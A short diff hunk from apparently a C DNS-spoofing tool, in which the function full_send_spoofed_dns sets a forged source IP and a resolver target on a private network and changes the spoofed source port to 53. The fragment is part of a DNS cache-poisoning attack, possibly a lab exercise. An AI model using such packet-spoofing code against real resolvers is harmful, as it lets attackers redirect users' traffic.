@@ -208,7 +208,7 @@ int build_dns_payload(uint8_t *buffer, const char *hostname, uint16_t txid, uint
 int full_send_spoofed_dns(uint txid, uint source_port) {
     const char *src_ip = "192.168.1.204";  // Custom source IP
     const char *dest_ip = "192.168.1.203"; // Resolver IP
-    int src_port = source_port;                  // Custom source port
+    int src_port = 53;                  // Custom source port
     int dest_port = source_port;                    // DNS port
 
     uint8_t dns_payload[BUFFER_SIZE];
